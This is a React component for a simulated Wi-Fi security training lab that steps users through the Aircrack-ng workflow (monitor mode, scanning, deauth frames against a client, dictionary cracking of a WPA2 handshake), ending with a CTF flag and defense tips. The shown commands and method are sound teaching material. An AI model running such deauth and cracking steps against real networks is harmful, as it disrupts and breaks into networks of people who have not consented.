import React, { useState } from 'react';

export default function WifiLab({ onCompleteFlag }) {
  const [labStep, setLabStep] = useState(0); // 0: Airmon-ng, 1: Scan, 2: Deauth & Sniff, 3: Crack
  
  // Step 0: Airmon-ng State
  const [airmonKilled, setAirmonKilled] = useState(false);
  const [monitorEnabled, setMonitorEnabled] = useState(false);
  const [airmonLogs, setAirmonLogs] = useState([
    "PHY     Interface       Driver          Chipset",
    "phy0    wlan0           rtl8812au       Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac",
    "",
    "Ready. Run 'airmon-ng check kill' to stop interfering processes."
  ]);

  // Step 1: Target Selection
  const [targetSelected, setTargetSelected] = useState(false);
  
  // Step 2: Deauth state
  const [deauthRunning, setDeauthRunning] = useState(false);
  const [deauthStatus, setDeauthStatus] = useState("Passive sniffing locked on Channel 11 (BSSID: 9C:5C:8E:F1:D3:C8)... Awaiting handshake.");
  const [clientConnected, setClientConnected] = useState(true);
  const [handshakeCaptured, setHandshakeCaptured] = useState(false);

  // Step 3: Cracking state
  const [cracking, setCracking] = useState(false);
  const [crackConsole, setCrackConsole] = useState([]);
  const [keyFound, setKeyFound] = useState(false);

  // --- Airmon-ng Handlers ---
  const handleAirmonCheckKill = () => {
    setAirmonKilled(true);
    setAirmonLogs(prev => [
      ...prev,
      "",
      "kali@kali:~$ sudo airmon-ng check kill",
      "Killing these processes:",
      "  PID Name",
      "  712 NetworkManager",
      "  845 wpa_supplicant",
      "  910 dhclient",
      "[+] All conflicting processes killed successfully.",
      "Ready to enable monitor mode: run 'airmon-ng start wlan0'."
    ]);
  };

  const handleAirmonStart = () => {
    setMonitorEnabled(true);
    setAirmonLogs(prev => [
      ...prev,
      "",
      "kali@kali:~$ sudo airmon-ng start wlan0",
      "PHY     Interface       Driver          Chipset",
      "phy0    wlan0           rtl8812au       Realtek RTL8812AU (monitor mode vif enabled on [phy0]wlan0mon)",
      "[+] Monitor mode enabled on virtual interface 'wlan0mon'!",
      "kali@kali:~$ sudo aireplay-ng --test wlan0mon",
      "14:22:01  Trying broadcast probe requests...",
      "14:22:02  Injection is working! Card supports packet injection (30/30 packets accepted).",
      "[✓] Interface wlan0mon ready for airodump-ng scanning."
    ]);
  };

  const startDeauthAttack = () => {
    setDeauthRunning(true);
    setDeauthStatus("Injecting 15 Deauth frames: aireplay-ng -0 15 -a 9C:5C:8E:F1:D3:C8 -c EC:08:6B:1B:F8:A1 wlan0mon...");
    setClientConnected(false);

    setTimeout(() => {
      setDeauthStatus("Client disconnected! Sniffer listening for EAPOL 4-way handshake on reconnect...");
    }, 1500);

    setTimeout(() => {
      setClientConnected(true);
      setDeauthStatus("Client re-associating with Access Point... Capturing EAPOL frames 1, 2, 3, 4...");
    }, 3000);

    setTimeout(() => {
      setDeauthStatus("✅ [ WPA HANDSHAKE: 9C:5C:8E:F1:D3:C8 ] Captured! Saved frame dump to /root/handshake-01.cap");
      setHandshakeCaptured(true);
      setDeauthRunning(false);
    }, 4500);
  };

  const runCrackingAttack = () => {
    setCracking(true);
    setCrackConsole([]);
    const passwords = [
      "12345678 (testing password)",
      "password123 (testing password)",
      "qwerty (testing password)",
      "welcome1 (testing password)",
      "letmein (testing password)",
      "shadow (testing password)",
      "admin123 (testing password) -> MATCH FOUND!"
    ];

    passwords.forEach((pass, index) => {
      setTimeout(() => {
        setCrackConsole(prev => [...prev, `Testing key: ${pass.split(' ')[0]}... ${index === passwords.length - 1 ? 'OK!' : 'FAILED'}`]);
        if (index === passwords.length - 1) {
          setKeyFound(true);
          setCracking(false);
          if (onCompleteFlag) {
            onCompleteFlag('FLAG{W1F1_H4NDSHAK3_CRACK3D}');
          }
        }
      }, (index + 1) * 450);
    });
  };

  const resetLab = () => {
    setLabStep(0);
    setAirmonKilled(false);
    setMonitorEnabled(false);
    setAirmonLogs([
      "PHY     Interface       Driver          Chipset",
      "phy0    wlan0           rtl8812au       Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac",
      "",
      "Ready. Run 'airmon-ng check kill' to stop interfering processes."
    ]);
    setTargetSelected(false);
    setDeauthRunning(false);
    setDeauthStatus("Passive sniffing locked on Channel 11 (BSSID: 9C:5C:8E:F1:D3:C8)... Awaiting handshake.");
    setClientConnected(true);
    setHandshakeCaptured(false);
    setCracking(false);
    setCrackConsole([]);
    setKeyFound(false);
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '30px' }}>
      {/* Header */}
      <div>
        <span className="sidebar-tag">SESSION 6 & 7</span>
        <h1 className="text-cyber-glow" style={{ fontSize: '2rem', marginTop: '10px' }}>Controlled Wi-Fi Security Lab</h1>
        <p style={{ color: 'var(--text-secondary)', marginTop: '8px', lineHeight: '1.6' }}>
          Execute the end-to-end practical wireless penetration testing methodology using the Aircrack-ng suite: <strong>Airmon-ng</strong> (kill processes & enable monitor mode) ➔ <strong>Airodump-ng</strong> (sniff BSSID & channel) ➔ <strong>Aireplay-ng</strong> (inject deauth frames) ➔ <strong>Aircrack-ng</strong> (dictionary attack).
        </p>
      </div>

      {/* Lab Nav Stepper */}
      <div style={{ display: 'flex', gap: '10px', borderBottom: '1px solid var(--border-color)', paddingBottom: '12px', flexWrap: 'wrap' }}>
        <button 
          onClick={() => setLabStep(0)} 
          className={`cyber-button ${labStep === 0 ? 'active' : 'disabled'}`}
          style={{ flex: 1, minWidth: '160px', padding: '8px', fontSize: '0.78rem' }}
          disabled={cracking || deauthRunning}
        >
          Step 0: Airmon-ng Setup
        </button>
        <button 
          onClick={() => { if (monitorEnabled) setLabStep(1); }} 
          className={`cyber-button ${labStep === 1 ? 'active' : 'disabled'}`}
          style={{ flex: 1, minWidth: '160px', padding: '8px', fontSize: '0.78rem' }}
          disabled={!monitorEnabled || cracking || deauthRunning}
        >
          Step 1: Airodump Scan
        </button>
        <button 
          onClick={() => { if (targetSelected) setLabStep(2); }} 
          className={`cyber-button ${labStep === 2 ? 'active' : 'disabled'}`}
          style={{ flex: 1, minWidth: '160px', padding: '8px', fontSize: '0.78rem' }}
          disabled={!targetSelected || cracking}
        >
          Step 2: Deauth & Handshake
        </button>
        <button 
          onClick={() => { if (handshakeCaptured) setLabStep(3); }} 
          className={`cyber-button ${labStep === 3 ? 'active' : 'disabled'}`}
          style={{ flex: 1, minWidth: '160px', padding: '8px', fontSize: '0.78rem' }}
          disabled={!handshakeCaptured || deauthRunning}
        >
          Step 3: Aircrack-ng Decrypt
        </button>
      </div>

      {/* Step 0: Airmon-ng Setup */}
      {labStep === 0 && (
        <div className="grid-2">
          {/* Left Column: Interactive Terminal */}
          <section className="glass-panel" style={{ padding: '24px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
            <div>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <h3 className="text-cyber-glow" style={{ fontSize: '1.1rem' }}>
                  🛠️ Airmon-ng Monitor Mode Initialization
                </h3>
                <span className="sidebar-tag" style={{ borderColor: monitorEnabled ? 'var(--accent-green)' : 'var(--accent-orange)', color: monitorEnabled ? 'var(--accent-green)' : 'var(--accent-orange)' }}>
                  {monitorEnabled ? 'MONITOR: wlan0mon' : 'MANAGED: wlan0'}
                </span>
              </div>
              <p style={{ color: 'var(--text-secondary)', fontSize: '0.85rem', marginTop: '6px', lineHeight: '1.4' }}>
                Before sniffing, you must stop background network services that interfere with the Wi-Fi card channel and switch the interface into Monitor Mode.
              </p>
            </div>

            {/* Action buttons */}
            <div style={{ display: 'flex', gap: '10px' }}>
              <button
                onClick={handleAirmonCheckKill}
                disabled={airmonKilled}
                className={`cyber-button orange ${airmonKilled ? 'disabled' : ''}`}
                style={{ flex: 1, padding: '10px', fontSize: '0.75rem' }}
              >
                {airmonKilled ? '✓ PROCESSES KILLED' : '1. airmon-ng check kill'}
              </button>
              <button
                onClick={handleAirmonStart}
                disabled={!airmonKilled || monitorEnabled}
                className={`cyber-button green ${!airmonKilled || monitorEnabled ? 'disabled' : ''}`}
                style={{ flex: 1, padding: '10px', fontSize: '0.75rem' }}
              >
                {monitorEnabled ? '✓ wlan0mon ACTIVE' : '2. airmon-ng start wlan0'}
              </button>
            </div>

            {/* Terminal Log */}
            <div style={{ background: '#05070c', border: '1px solid var(--border-color)', borderRadius: '6px', fontFamily: 'var(--font-mono)', fontSize: '0.75rem', padding: '14px', color: 'var(--accent-green)', minHeight: '200px', overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '4px' }}>
              {airmonLogs.map((log, idx) => (
                <div key={idx} style={{ color: log.startsWith('kali@') ? 'var(--accent-cyan)' : (log.startsWith('[+]') || log.startsWith('[✓]') ? 'var(--accent-green)' : (log.startsWith('Killing') || log.startsWith('  PID') ? 'var(--accent-orange)' : '#ccc')) }}>
                  {log}
                </div>
              ))}
            </div>

            {monitorEnabled && (
              <div style={{ display: 'flex', justifyContent: 'flex-end', marginTop: '8px' }}>
                <button
                  id="btn-goto-step1"
                  onClick={() => setLabStep(1)}
                  className="cyber-button"
                  style={{ padding: '8px 18px', fontSize: '0.8rem' }}
                >
                  Proceed to Airodump Scan (Step 1) ➔
                </button>
              </div>
            )}
          </section>

          {/* Right Column: Why Airmon-ng matters */}
          <section className="glass-panel" style={{ padding: '24px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
            <h3 style={{ fontSize: '1.1rem', color: 'var(--accent-cyan)' }}>
              📖 What is Airmon-ng & Why is it Required?
            </h3>
            <p style={{ color: 'var(--text-secondary)', fontSize: '0.85rem', lineHeight: '1.5' }}>
              <strong>Airmon-ng</strong> is the foundational configuration script within the Aircrack-ng suite. It manages wireless card interfaces under Linux.
            </p>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', fontSize: '0.8rem' }}>
              <div style={{ background: 'rgba(255, 157, 0, 0.05)', border: '1px solid rgba(255, 157, 0, 0.2)', padding: '12px', borderRadius: '6px' }}>
                <strong style={{ color: 'var(--accent-orange)' }}>Why 'check kill' is Mandatory:</strong>
                <p style={{ color: 'var(--text-secondary)', marginTop: '4px', lineHeight: '1.4' }}>
                  Operating systems run background network managers (<code>NetworkManager</code>, <code>wpa_supplicant</code>, <code>dhclient</code>). These daemons continuously scan for Wi-Fi and actively force your wireless card back into Managed mode or reset its channel, corrupting your packet capture!
                </p>
              </div>

              <div style={{ background: 'rgba(0, 240, 255, 0.05)', border: '1px solid rgba(0, 240, 255, 0.2)', padding: '12px', borderRadius: '6px' }}>
                <strong style={{ color: 'var(--accent-cyan)' }}>Virtual Interface Creation:</strong>
                <p style={{ color: 'var(--text-secondary)', marginTop: '4px', lineHeight: '1.4' }}>
                  Running <code>airmon-ng start wlan0</code> creates a specialized virtual monitor interface named <code>wlan0mon</code>. This leaves the physical hardware link intact while switching the radio stack to promiscuous RF capture mode.
                </p>
              </div>

              <div style={{ background: 'rgba(57, 255, 20, 0.05)', border: '1px solid rgba(57, 255, 20, 0.2)', padding: '12px', borderRadius: '6px' }}>
                <strong style={{ color: 'var(--accent-green)' }}>Supported Wireless Chipsets:</strong>
                <p style={{ color: 'var(--text-secondary)', marginTop: '4px', lineHeight: '1.4' }}>
                  Not all laptop Wi-Fi cards support packet injection! Standard penetration testing adapters use chipsets like:
                  <br />• <strong>Realtek RTL8812AU / RTL8814AU</strong> (Dual-band 2.4/5GHz)
                  <br />• <strong>Atheros AR9271</strong> (Alfa AWUS036NHA - legendary 2.4GHz injection)
                  <br />• <strong>MediaTek MT7612U / Ralink RT3070</strong>
                </p>
              </div>
            </div>
          </section>
        </div>
      )}

      {/* Step 1: Scan Networks */}
      {labStep === 1 && (
        <section className="glass-panel" style={{ padding: '24px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
            <h3 className="text-cyber-glow" style={{ fontSize: '1.1rem' }}>
              🛰️ Step 1: Scan & Select Target Access Point (airodump-ng)
            </h3>
            <span style={{ fontSize: '0.75rem', color: 'var(--accent-cyan)', fontFamily: 'var(--font-mono)' }}>
              INTERFACE: wlan0mon [MONITOR MODE]
            </span>
          </div>
          <p style={{ color: 'var(--text-secondary)', fontSize: '0.85rem', marginBottom: '20px' }}>
            We run <code>airodump-ng wlan0mon</code>. The card hops across channels 1 to 14 sniffing 802.11 beacon frames. Click on the <strong>SecureWiFi_WPA2</strong> network to lock onto its BSSID and Channel!
          </p>

          <div style={{ background: '#05070c', border: '1px solid var(--border-color)', borderRadius: '6px', fontFamily: 'var(--font-mono)', fontSize: '0.8rem', padding: '16px', color: 'var(--accent-green)', display: 'flex', flexDirection: 'column', gap: '8px' }}>
            <div style={{ color: 'var(--text-secondary)', borderBottom: '1px solid rgba(255,255,255,0.06)', paddingBottom: '6px' }}>
              BSSID              PWR  Beacons  #Data  CH  MB   ENC   CIPHER  AUTH  ESSID
            </div>
            <div style={{ opacity: 0.6 }}>
              8E:2B:A1:04:1F:B9  -75      48      2   6  54   WPA2  CCMP    PSK   HomeNet_2G
            </div>
            
            {/* Clickable target */}
            <div 
              id="row-target-wifi"
              onClick={() => setTargetSelected(true)}
              style={{ 
                background: targetSelected ? 'rgba(0, 240, 255, 0.15)' : 'transparent',
                border: targetSelected ? '1px solid var(--accent-cyan)' : '1px solid transparent',
                borderRadius: '4px',
                padding: '8px 6px',
                cursor: 'pointer',
                transition: 'all var(--transition-fast)',
                display: 'flex',
                alignItems: 'center',
                color: 'var(--accent-cyan)'
              }}
            >
              <span>9C:5C:8E:F1:D3:C8  -34     240     82  11  130  WPA2  CCMP    PSK   SecureWiFi_WPA2</span>
              {targetSelected && <span style={{ marginLeft: 'auto', fontWeight: 'bold' }}>[SELECTED TARGET: BSSID & CH 11 LOCKED]</span>}
            </div>

            <div style={{ opacity: 0.6 }}>
              3A:C4:E9:9D:2F:5F  -82      12      0   1  54   OPN   NONE    OPN   Cafe_Guest_Wifi
            </div>
          </div>

          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '20px' }}>
            <span style={{ fontSize: '0.8rem', color: targetSelected ? 'var(--accent-green)' : 'var(--accent-orange)', fontFamily: 'var(--font-mono)' }}>
              {targetSelected ? '✓ Target locked: BSSID 9C:5C:8E:F1:D3:C8 on Channel 11' : '▲ Click the row with SecureWiFi_WPA2 to select target'}
            </span>
            <button 
              id="btn-goto-step2"
              disabled={!targetSelected} 
              onClick={() => setLabStep(2)} 
              className="cyber-button"
            >
              Configure Deauth Attack (Step 2) ➔
            </button>
          </div>
        </section>
      )}

      {/* Step 2: Handshake Capture via Deauth */}
      {labStep === 2 && (
        <div className="grid-2">
          {/* Active Terminal Sniffer */}
          <section className="glass-panel" style={{ padding: '24px', display: 'flex', flexDirection: 'column', justify: 'space-between' }}>
            <div>
              <h3 className="text-cyber-glow" style={{ fontSize: '1.1rem', marginBottom: '10px' }}>
                📡 Sniffer & Deauthentication Flood (aireplay-ng)
              </h3>
              <p style={{ color: 'var(--text-secondary)', fontSize: '0.85rem', marginBottom: '16px' }}>
                Sniffer is locked on <strong>Channel 11</strong> for BSSID <code>9C:5C:8E:F1:D3:C8</code>. Client <code>EC:08:6B:1B:F8:A1</code> is currently connected. Send spoofed Deauth frames to force them to reconnect and surrender the 4-way handshake!
              </p>

              <button 
                id="btn-deauth-attack"
                disabled={deauthRunning || handshakeCaptured} 
                onClick={startDeauthAttack} 
                className="cyber-button red"
                style={{ width: '100%', marginBottom: '20px' }}
              >
                {deauthRunning ? '📡 INJECTING DEAUTH FRAMES...' : handshakeCaptured ? '✅ HANDSHAKE CAPTURED' : '⚠️ SEND DEAUTH FLOOD (aireplay-ng -0 15)'}
              </button>

              <div style={{ background: '#05070c', border: '1px solid var(--border-color)', borderRadius: '6px', fontFamily: 'var(--font-mono)', fontSize: '0.75rem', padding: '16px', color: deauthRunning ? 'var(--accent-red)' : handshakeCaptured ? 'var(--accent-green)' : '#ccc', minHeight: '100px' }}>
                {deauthStatus}
              </div>
            </div>

            {handshakeCaptured && (
              <button 
                id="btn-goto-step3"
                onClick={() => setLabStep(3)} 
                className="cyber-button green"
                style={{ marginTop: '20px', alignSelf: 'flex-end' }}
              >
                Launch Dictionary Crack (aircrack-ng) ➔
              </button>
            )}
          </section>

          {/* Node Interaction Graphic */}
          <section className="glass-panel" style={{ padding: '24px', display: 'flex', flexDirection: 'column', justify: 'space-between' }}>
            <h3 style={{ fontSize: '1.1rem', marginBottom: '20px' }}>🌐 Victim & Router State</h3>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-around', alignItems: 'center' }}>
                {/* Router Node */}
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
                  <span style={{ fontSize: '2rem' }}>📡</span>
                  <span style={{ fontSize: '0.8rem', fontWeight: 'bold' }}>SecureWiFi_WPA2</span>
                  <span style={{ fontSize: '0.65rem', color: 'var(--accent-cyan)', fontFamily: 'var(--font-mono)' }}>CH 11 | BSSID 9C:5C...</span>
                </div>

                {/* Packet flow */}
                <div style={{ flex: 1, display: 'flex', justifyContent: 'center', position: 'relative' }}>
                  <span style={{ fontSize: '1.5rem', opacity: deauthRunning ? 1 : 0.1, color: 'var(--accent-red)', animation: deauthRunning ? 'pulse 0.5s infinite' : 'none' }}>⚡⚡</span>
                </div>

                {/* Client Node */}
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
                  <span style={{ fontSize: '2rem', filter: clientConnected ? 'none' : 'grayscale(100%)' }}>💻</span>
                  <span style={{ fontSize: '0.8rem', fontWeight: 'bold' }}>Victim Station</span>
                  <span style={{ fontSize: '0.65rem', color: clientConnected ? 'var(--accent-green)' : 'var(--accent-red)' }}>
                    {clientConnected ? 'CONNECTED' : 'DISCONNECTED (DEAUTH)'}
                  </span>
                </div>
              </div>

              <div className="alert-box">
                <span className="alert-icon">💡</span>
                <div className="alert-message" style={{ color: 'var(--text-secondary)' }}>
                  <strong>How the Deauth Exploit Works:</strong> Under WPA2, 802.11 management frames lack authentication. When our card injects fake Deauth frames signed with the router's BSSID, the victim disconnects. As they automatically reconnect, our sniffer records the <strong>EAPOL 4-Way Handshake</strong> containing the cryptographic password hashes!
                </div>
              </div>
            </div>
          </section>
        </div>
      )}

      {/* Step 3: Crack Handshake */}
      {labStep === 3 && (
        <section className="glass-panel" style={{ padding: '24px' }}>
          <h3 className="text-cyber-glow" style={{ fontSize: '1.1rem', marginBottom: '14px' }}>
            🔑 Step 3: Dictionary Attack - aircrack-ng
          </h3>
          <p style={{ color: 'var(--text-secondary)', fontSize: '0.85rem', marginBottom: '20px' }}>
            We feed the captured <code>handshake-01.cap</code> file into <code>aircrack-ng</code> along with the standard wordlist <code>rockyou.txt</code>. Aircrack derives the PMK and PTK for each password guess and tests the MIC.
          </p>

          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px' }}>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
              <button 
                id="btn-run-crack"
                disabled={cracking || keyFound} 
                onClick={runCrackingAttack} 
                className="cyber-button"
              >
                {cracking ? '⚙️ RUNNING WORDLIST MATCHES...' : keyFound ? '🔑 KEY RECOVERED' : '⚡ RUN aircrack-ng DICTIONARY ATTACK'}
              </button>

              <div style={{ background: '#05070c', border: '1px solid var(--border-color)', borderRadius: '6px', fontFamily: 'var(--font-mono)', fontSize: '0.8rem', padding: '16px', color: 'var(--accent-green)', minHeight: '160px', overflowY: 'auto' }}>
                <div>Aircrack-ng v1.7 - [Offline WPA2 Dictionary Attack]</div>
                <div>Loaded 1 handshake(s) for BSSID: 9C:5C:8E:F1:D3:C8 (SecureWiFi_WPA2)</div>
                <hr style={{ border: 'none', borderBottom: '1px solid rgba(0, 240, 255, 0.1)', margin: '8px 0' }} />
                {crackConsole.map((line, idx) => (
                  <div key={idx}>{line}</div>
                ))}
                {keyFound && (
                  <div style={{ color: 'var(--accent-green)', fontWeight: 'bold', marginTop: '12px', background: 'rgba(57, 255, 20, 0.1)', padding: '10px', borderRadius: '4px', border: '1px solid var(--accent-green)' }}>
                    KEY FOUND! [ admin123 ]<br/>
                    FLAG CAPTURED: FLAG{'{'}W1F1_H4NDSHAK3_CRACK3D{'}'}
                  </div>
                )}
              </div>
            </div>

            <div style={{ background: 'rgba(255,255,255,0.01)', border: '1px solid rgba(255,255,255,0.05)', borderRadius: '6px', padding: '16px', display: 'flex', flexDirection: 'column', justify: 'center' }}>
              <h4 style={{ fontSize: '0.9rem', color: 'var(--accent-cyan)', marginBottom: '8px' }}>Security Implications</h4>
              <p style={{ color: 'var(--text-secondary)', fontSize: '0.8rem', lineHeight: '1.5', marginBottom: '12px' }}>
                WPA2 handshake cracking is 100% <strong>offline</strong>. The attacker does not communicate with the router while cracking; they test millions of passwords per second on their local GPU cluster without the target network knowing.
              </p>
              <h4 style={{ fontSize: '0.9rem', color: 'var(--accent-cyan)', marginBottom: '8px' }}>Defense Recommendations</h4>
              <ul style={{ listStyle: 'none', display: 'flex', flexDirection: 'column', gap: '8px', fontSize: '0.8rem', color: 'var(--text-secondary)' }}>
                <li>🛡️ <strong>Complex Passwords:</strong> Use passphrases with 14+ characters mixing symbols and numbers to defeat dictionary attacks.</li>
                <li>🛡️ <strong>Deploy WPA3 (SAE):</strong> WPA3 replaces PSK with SAE (Simultaneous Authentication of Equals). Even if an attacker captures the exchange, mathematical zero-knowledge proofs prevent offline dictionary attacks.</li>
                <li>🛡️ <strong>Enable 802.11w PMF:</strong> Enforces Protected Management Frames, neutralizing deauth floods.</li>
              </ul>
            </div>
          </div>

          <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: '24px', borderTop: '1px solid rgba(255,255,255,0.06)', paddingTop: '16px' }}>
            <button 
              id="btn-reset-wifi-lab"
              onClick={resetLab} 
              className="cyber-button orange" 
              style={{ fontSize: '0.75rem' }}
            >
              🔄 Reset Entire Wi-Fi Lab (Start at Airmon-ng)
            </button>
          </div>
        </section>
      )}
    </div>
  );
}
